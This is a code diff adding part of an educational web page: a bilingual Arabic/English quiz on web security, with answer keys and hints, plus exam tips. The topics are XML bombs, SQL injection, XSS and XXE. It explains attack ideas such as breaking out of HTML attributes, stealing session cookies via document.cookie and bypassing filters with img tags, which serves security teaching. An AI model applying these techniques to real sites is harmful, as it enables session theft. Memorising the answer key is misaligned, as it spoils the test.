+    <div class="score-emoji" id="quiz-score-emoji"><i class="fa-solid fa-trophy" aria-hidden="true"></i></div>
+    <div class="score-display" id="quiz-score-display">0 / 10</div>
+    <button class="nav-btn" onclick="Garden.retryQuiz()" data-i18n="quiz.retry">إعادة الاختبار</button>
+  </div>
+</section>
+<script type="application/json" id="quiz-data">
+[
+  {
+    "id": 1,
+    "question": {
+      "ar": "أي مما يلي يمثل الهدف الأساسي لهجوم قنبلة XML (XML Bomb)؟",
+      "en": "Which of the following represents the primary goal of an XML Bomb attack?"
+    },
+    "options": {
+      "ar": [
+        "سرقة كلمات المرور من قاعدة البيانات",
+        "التسبب في تعطل التطبيق أو حجب الخدمة (DoS)",
+        "تسريب معلومات حساسة من ملفات النظام",
+        "حقن كود Javascript في متصفح العميل"
+      ],
+      "en": [
+        "Stealing passwords from the database",
+        "Causing the application to crash or Denial of Service (DoS)",
+        "Leaking sensitive information from system files",
+        "Injecting Javascript code into the client's browser"
+      ]
+    },
+    "correctIndex": 1,
+    "explanation": {
+      "ar": "قنابل XML مصممة لاستهلاك الموارد بشكل مفرط (مثل الذاكرة) مما يؤدي إلى تعطل محلل XML أو التطبيق، وهو شكل من أشكال حجب الخدمة.",
+      "en": "XML Bombs are designed to consume excessive resources (like memory) causing the XML parser or application to crash, which is a form of Denial of Service."
+    },
+    "hint": {
+      "ar": "تذكر مصطلح 'قنبلة' وتأثيرها على استقرار النظام.",
+      "en": "Remember the term 'bomb' and its effect on system stability."
+    },
+    "difficulty": "easy",
+    "conceptId": "xml-injection"
+  },
+  {
+    "id": 2,
+    "question": {
+      "ar": "في هجوم حقن SQL، ماذا يفعل الرمز <code>--</code> عادةً؟",
+      "en": "In an SQL injection attack, what does the <code>--</code> symbol typically do?"
+    },
+    "options": {
+      "ar": [
+        "يضيف مستخدماً جديداً إلى قاعدة البيانات",
+        "يجعل الشرط المنطقي صحيحاً دائماً",
+        "يحول بقية الاستعلام الأصلي إلى تعليق لتجاهله",
+        "يفصل بين استعلامين مختلفين لتنفيذهما معاً"
+      ],
+      "en": [
+        "Adds a new user to the database",
+        "Makes the logical condition always true",
+        "Turns the rest of the original query into a comment to ignore it",
+        "Separates two different queries to execute them together"
+      ]
+    },
+    "correctIndex": 2,
+    "explanation": {
+      "ar": "يُستخدم الرمز <code>--</code> في SQL لبدء تعليق، مما يسمح للمهاجم بإلغاء أو تجاهل بقية الاستعلام الذي كتبه المطور (مثل التحقق من كلمة المرور).",
+      "en": "The <code>--</code> symbol is used in SQL to start a comment, allowing the attacker to cancel or ignore the rest of the query written by the developer (like password validation)."
+    },
+    "hint": {
+      "ar": "كيف يمكنك إخفاء جزء من الكود عن المترجم؟",
+      "en": "How do you hide a part of code from the compiler?"
+    },
+    "difficulty": "medium",
+    "conceptId": "sql-injection"
+  },
+  {
+    "id": 3,
+    "question": {
+      "ar": "أي من الأطراف التالية ليس جزءاً من هجوم البرمجة عبر المواقع (XSS) النموذجي؟",
+      "en": "Which of the following parties is NOT part of a typical Cross Site Scripting (XSS) attack?"
+    },
+    "options": {
+      "ar": [
+        "المهاجم (Attacker)",
+        "خادم قاعدة البيانات (Database Server)",
+        "العميل / الضحية (Client)",
+        "موقع الويب (Web site)"
+      ],
+      "en": [
+        "The Attacker",
+        "The Database Server",
+        "The Client / Victim",
+        "The Web site"
+      ]
+    },
+    "correctIndex": 1,
+    "explanation": {
+      "ar": "هجوم XSS يشمل ثلاثة أطراف: المهاجم، العميل، وموقع الويب. خادم قاعدة البيانات ليس طرفاً مباشراً في تنفيذ سكربت XSS، حيث يتم التنفيذ في متصفح العميل.",
+      "en": "An XSS attack involves three parties: the attacker, the client, and the web site. The database server is not a direct party in executing the XSS script, as execution happens in the client's browser."
+    },
+    "hint": {
+      "ar": "أين يتم تنفيذ الكود الخبيث في هجوم XSS؟",
+      "en": "Where is the malicious code executed in an XSS attack?"
+    },
+    "difficulty": "medium",
+    "conceptId": "cross-site-scripting"
+  },
+  {
+    "id": 4,
+    "question": {
+      "ar": "ما هو الإجراء الصحيح لمنع هجمات إفشاء الكيانات الخارجية (XXE) في بيئة PHP؟",
+      "en": "What is the correct action to prevent XXE Disclosure attacks in a PHP environment?"
+    },
+    "options": {
+      "ar": [
+        "استخدام الدالة htmlspecialchars()",
+        "تعيين XmlResolver = null",
+        "استخدام الدالة libxml_disable_entity_loader(true)",
+        "تشفير ملفات XML قبل التحليل"
+      ],
+      "en": [
+        "Using the htmlspecialchars() function",
+        "Setting XmlResolver = null",
+        "Using the libxml_disable_entity_loader(true) function",
+        "Encrypting XML files before parsing"
+      ]
+    },
+    "correctIndex": 2,
+    "explanation": {
+      "ar": "في PHP، عند استخدام محلل XML الافتراضي، يتم منع هجمات XXE عن طريق تعطيل تحميل الكيانات الخارجية باستخدام <code>libxml_disable_entity_loader(true)</code>.",
+      "en": "In PHP, when using the default XML parser, XXE attacks are prevented by disabling external entity loading using <code>libxml_disable_entity_loader(true)</code>."
+    },
+    "hint": {
+      "ar": "ابحث عن الدالة الخاصة بمكتبة libxml.",
+      "en": "Look for the function specific to the libxml library."
+    },
+    "difficulty": "hard",
+    "conceptId": "xml-injection"
+  },
+  {
+    "id": 5,
+    "question": {
+      "ar": "ما هو الفرق الرئيسي بين الاختراق الأخلاقي والاختراق الخبيث؟",
+      "en": "What is the main difference between ethical hacking and malicious hacking?"
+    },
+    "options": {
+      "ar": [
+        "الأدوات المستخدمة",
+        "التقنيات المطبقة",
+        "الشرعية (القانونية) والإذن",
+        "مستوى مهارة المخترق"
+      ],
+      "en": [
+        "The tools used",
+        "The techniques applied",
+        "Legality and permission",
+        "The skill level of the hacker"
+      ]
+    },
+    "correctIndex": 2,
+    "explanation": {
+      "ar": "يستخدم المخترقون الأخلاقيون نفس الأدوات والتقنيات التي يستخدمها القراصنة الخبيثون، ولكن الفرق الرئيسي هو أن الاختراق الأخلاقي قانوني ويتم بإذن مسبق.",
+      "en": "Ethical hackers use the same tools and techniques as malicious hackers, but the major difference is that ethical hacking is legal and done with prior permission."
+    },
+    "hint": {
+      "ar": "لماذا لا يتم القبض على المخترقين الأخلاقيين؟",
+      "en": "Why don't ethical hackers get arrested?"
+    },
+    "difficulty": "easy",
+    "conceptId": "ethical-hacking"
+  },
+  {
+    "id": 6,
+    "question": {
+      "ar": "أي من تقنيات التخفيف التالية تقوم بتصفية بيانات المستخدم عند إرسالها مرة أخرى إلى المتصفح بدلاً من وقت استلامها؟",
+      "en": "Which of the following mitigation techniques filters user data when it is sent back to the browser rather than when it is received?"
+    },
+    "options": {
+      "ar": [
+        "تصفية المدخلات (Input Filtering)",
+        "تصفية المخرجات (Output Filtering)",
+        "جدار حماية تطبيقات الويب (WAF)",
+        "الاستعلامات ذات المعلمات (Parameterized Queries)"
+      ],
+      "en": [
+        "Input Filtering",
+        "Output Filtering",
+        "Web Application Firewall (WAF)",
+        "Parameterized Queries"
+      ]
+    },
+    "correctIndex": 1,
+    "explanation": {
+      "ar": "تصفية المخرجات (Output filtering) تعني تطبيق الفلتر على البيانات قبل عرضها للمستخدم مباشرة، وهو مفيد بشكل خاص للبيانات المستخرجة من قاعدة البيانات.",
+      "en": "Output filtering means applying the filter to the data right before it is presented to the user, which is especially useful for data retrieved from a database."
+    },
+    "hint": {
+      "ar": "الاسم يدل على مكان خروج البيانات من النظام.",
+      "en": "The name indicates where data exits the system."
+    },
+    "difficulty": "medium",
+    "conceptId": "cross-site-scripting"
+  },
+  {
+    "id": 7,
+    "question": {
+      "ar": "ما هو المصطلح الذي يصف وجود مكتبات معلنة في البرنامج النصي للبناء ولكنها غير ضرورية لتنفيذ التطبيق؟",
+      "en": "What term describes the presence of libraries declared in the build script but not necessary for executing the application?"
+    },
+    "options": {
+      "ar": [
+        "تضخم الكود (Code Bloat)",
+        "حقن المكتبات (Library Injection)",
+        "تضخم المكتبات (Library Bloat)",
+        "تجاوز سعة المخزن المؤقت (Buffer Overflow)"
+      ],
+      "en": [
+        "Code Bloat",
+        "Library Injection",
+        "Library Bloat",
+        "Buffer Overflow"
+      ]
+    },
+    "correctIndex": 2,
+    "explanation": {
+      "ar": "تضخم المكتبات (Library Bloat) يشير تحديداً إلى تضمين مكتبات غير مستخدمة، مما يزيد من حجم التطبيق ومساحة الهجوم المحتملة.",
+      "en": "Library Bloat specifically refers to the inclusion of unused libraries, which increases the application size and potential attack surface."
+    },
+    "hint": {
+      "ar": "ركز على كلمة 'مكتبات' في السؤال.",
+      "en": "Focus on the word 'libraries' in the question."
+    },
+    "difficulty": "easy",
+    "conceptId": "library-bloat"
+  },
+  {
+    "id": 8,
+    "question": {
+      "ar": "في هجوم XSS، إذا تم حقن البيانات كقيمة افتراضية لحقل نموذج HTML (مثل <code>&lt;input value=\"...\"&gt;</code>)، ماذا يجب أن يفعل المهاجم أولاً؟",
+      "en": "In an XSS attack, if data is injected as a default value of an HTML form field (like <code>&lt;input value=\"...\"&gt;</code>), what must the attacker do first?"
+    },
+    "options": {
+      "ar": [
+        "استخدام علامة &lt;img&gt; بدلاً من &lt;script&gt;",
+        "الهروب إلى سياق HTML الحر عن طريق إغلاق العلامة بـ <code>\"></code>",
+        "تشفير الحمولة باستخدام Base64",
+        "إرسال الطلب عبر POST بدلاً من GET"
+      ],
+      "en": [
+        "Use an &lt;img&gt; tag instead of &lt;script&gt;",
+        "Escape to the free HTML context by closing the tag with <code>\"></code>",
+        "Encode the payload using Base64",
+        "Send the request via POST instead of GET"
+      ]
+    },
+    "correctIndex": 1,
+    "explanation": {
+      "ar": "إذا كانت البيانات داخل سياق غير حر (مثل داخل سمة value)، يجب على المهاجم إغلاق تلك السمة والعلامة أولاً باستخدام <code>\"></code> قبل أن يتمكن من بدء علامة <code>&lt;script&gt;</code> الخاصة به.",
+      "en": "If the data is inside a non-free context (like inside a value attribute), the attacker must first close that attribute and tag using <code>\"></code> before they can start their own <code>&lt;script&gt;</code> tag."
+    },
+    "hint": {
+      "ar": "كيف تخرج من داخل علامة الاقتباس المزدوجة في HTML؟",
+      "en": "How do you break out of a double quote in HTML?"
+    },
+    "difficulty": "hard",
+    "conceptId": "cross-site-scripting"
+  },
+  {
+    "id": 9,
+    "question": {
+      "ar": "كيف يمكن لهجوم XSS أن يسرق جلسة المستخدم؟",
+      "en": "How can an XSS attack steal a user's session?"
+    },
+    "options": {
+      "ar": [
+        "عن طريق الوصول إلى قاعدة بيانات الخادم مباشرة",
+        "عن طريق قراءة <code>document.cookie</code> وإرسالها إلى خادم المهاجم",
+        "عن طريق تخمين كلمة المرور الخاصة بالمستخدم",
+        "عن طريق إيقاف تشغيل جدار الحماية الخاص بالمتصفح"
+      ],
+      "en": [
+        "By accessing the server's database directly",
+        "By reading <code>document.cookie</code> and sending it to the attacker's server",
+        "By guessing the user's password",
+        "By turning off the browser's firewall"
+      ]
+    },
+    "correctIndex": 1,
+    "explanation": {
+      "ar": "يمكن لسكربت Javascript الخبيث الوصول إلى ملفات تعريف الارتباط (cookies) الخاصة بالموقع الضعيف باستخدام <code>document.cookie</code> وإرسالها إلى المهاجم، مما يسمح له بانتحال شخصية الضحية.",
+      "en": "The malicious Javascript can access the vulnerable site's cookies using <code>document.cookie</code> and send them to the attacker, allowing them to impersonate the victim."
+    },
+    "hint": {
+      "ar": "أين يتم تخزين رموز الجلسة (Session tokens) عادة في المتصفح؟",
+      "en": "Where are session tokens usually stored in the browser?"
+    },
+    "difficulty": "medium",
+    "conceptId": "cross-site-scripting"
+  },
+  {
+    "id": 10,
+    "question": {
+      "ar": "ما هي الطريقة التي تستخدمها أدوات تقييم الثغرات الآلية للتحقق من أمان الموقع ضد XSS؟",
+      "en": "What method do automated vulnerability assessment tools use to check a site's security against XSS?"
+    },
+    "options": {
+      "ar": [
+        "مراجعة الكود المصدري للخادم يدوياً",
+        "الزحف إلى الموقع وإطلاق متغيرات من الحمولات ضد جميع المدخلات",
+        "تغيير كلمات مرور قاعدة البيانات",
+        "إيقاف تشغيل خادم الويب مؤقتاً"
+      ],
+      "en": [
+        "Manually reviewing the server's source code",
+        "Crawling the site and launching variants of payloads against all inputs",
+        "Changing database passwords",
+        "Temporarily shutting down the web server"
+      ]
+    },
+    "correctIndex": 1,
+    "explanation": {
+      "ar": "تقوم الأدوات الآلية بالزحف (crawling) إلى الموقع وتجربة العديد من الحمولات (payloads) المختلفة في المعلمات والرؤوس والمسارات لمعرفة ما إذا كان الموقع يعكس الكود بشكل قابل للتنفيذ.",
+      "en": "Automated tools crawl the site and try many different payloads in parameters, headers, and paths to see if the site reflects the code in an executable manner."
+    },
+    "hint": {
+      "ar": "كيف يختبر الروبوت (Bot) موقعاً بأكمله بسرعة؟",
+      "en": "How does a bot test an entire site quickly?"
+    },
+    "difficulty": "medium",
+    "conceptId": "cross-site-scripting"
+  }
+]
+</script>
+
+<section id="vault" class="vault-section glass-card fade-up">
+  <h2><i class="fa-solid fa-lock sec-icon" aria-hidden="true"></i> <span data-i18n="vault.title">خزنة الامتحان</span></h2>
+  <div class="vault-entry">
+    <div class="vault-type vault-type--trap"><i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i> <span data-i18n="vault.trap">فخ امتحاني</span></div>
+    <div data-bilingual>
+    <template class="content-ar">من الأخطاء الشائعة الاعتقاد بأن هجمات XSS تحدث فقط من خلال معلمات GET في عنوان URL. في الواقع، يمكن تنفيذها عبر طلبات POST، ومسارات HTTP، وحتى رؤوس HTTP مثل Referer.</template>
+    <template class="content-en">A common mistake is thinking XSS attacks only happen through GET parameters in the URL. In reality, they can be executed via POST requests, HTTP paths, and even HTTP headers like Referer.</template>
+    <div class="content-target"></div>
+    </div>
+  </div>
+  <div class="vault-entry">
+    <div class="vault-type vault-type--key"><i class="fa-solid fa-key" aria-hidden="true"></i> <span data-i18n="vault.key">مفهوم أساسي</span></div>
+    <div data-bilingual>
+    <template class="content-ar">الفرق الجوهري الوحيد بين الاختراق الأخلاقي والاختراق الخبيث هو 'الإذن'. يستخدم المخترق الأخلاقي نفس الأدوات والتقنيات، ولكنه يفعل ذلك بشكل قانوني لتحسين الأمن.</template>
+    <template class="content-en">The only fundamental difference between ethical hacking and malicious hacking is 'permission'. An ethical hacker uses the same tools and techniques, but does so legally to improve security.</template>
+    <div class="content-target"></div>
+    </div>
+  </div>
+  <div class="vault-entry">
+    <div class="vault-type vault-type--secret"><i class="fa-solid fa-user-secret" aria-hidden="true"></i> <span data-i18n="vault.secret">سر الامتحان</span></div>
+    <div data-bilingual>
+    <template class="content-ar">لا يتطلب هجوم XSS دائماً استخدام علامة <code>&lt;script></code>. يمكن للمهاجمين استخدام علامات HTML أخرى مثل <code>&lt;img></code> مع سمة <code>src</code> تحتوي على كود Javascript لتجاوز الفلاتر البسيطة.</template>
+    <template class="content-en">An XSS attack does not always require the <code>&lt;script></code> tag. Attackers can use other HTML tags like <code>&lt;img></code> with a <code>src</code> attribute containing Javascript to bypass simple filters.</template>
+    <div class="content-target"></div>
+    </div>
+  </div>
+  <div class="vault-entry">
+    <div class="vault-type vault-type--key"><i class="fa-solid fa-key" aria-hidden="true"></i> <span data-i18n="vault.key">مفهوم أساسي</span></div>
+    <div data-bilingual>
+    <template class="content-ar">لمنع هجمات قنابل XML، يجب تكوين محلل XML لتعطيل 'التوسع المضمن للكيانات' (inline expansion of entities)، مما يمنع النمو الأسي للبيانات الذي يسبب تعطل النظام.</template>
+    <template class="content-en">To prevent XML Bomb attacks, the XML parser must be configured to disable 'inline expansion of entities', preventing the exponential data growth that causes system crashes.</template>
+    <div class="content-target"></div>
+    </div>
+  </div>
+  <div class="vault-entry">
+    <div class="vault-type vault-type--trap"><i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i> <span data-i18n="vault.trap">فخ امتحاني</span></div>
+    <div data-bilingual>
+    <template class="content-ar">عند تطبيق 'تصفية المخرجات' (Output Filtering)، احذر من تطبيق الفلتر على السلسلة الأصلية المدخلة إلى قاعدة البيانات. يجب تطبيق الفلتر فقط على النسخة المخرجة (عند العرض) للحفاظ على سلامة البيانات الأصلية.</template>
+    <template class="content-en">When applying 'Output Filtering', beware of applying the filter to the original string inserted into the database. The filter should only be applied to the output version (upon display) to maintain original data integrity.</template>
+    <div class="content-target"></div>
+    </div>
+  </div>
+</section>
+
+    </main>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-links">
+        <a href="M11.html" class="footer-link" data-i18n="nav.prev">السابق</a>
+        <a href="index.html" class="footer-link" data-i18n="nav.home">الرئيسية</a>
+        <a href="index.html" class="footer-link" data-i18n="nav.next">التالي</a>
+        <button class="footer-link" aria-label="العودة إلى الأعلى" data-ar-title="العودة إلى الأعلى" data-en-title="Back to top" onclick="window.scrollTo({top:0,behavior:'smooth'})"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></button>
+      </div>
+      <span class="footer-brand"><i class="fa-solid fa-seedling" aria-hidden="true"></i> IT Level 7 · Digital Garden</span>
+    </div>
+  </footer>
+</div>
+
+<script src="../../shared/endpoints.js"></script>
+<script src="../../shared/garden.js"></script>
+<script src="../../shared/garden-header.js"></script>
+<script src="../../shared/firebase-sync.js"></script>
+</body>
+</html>
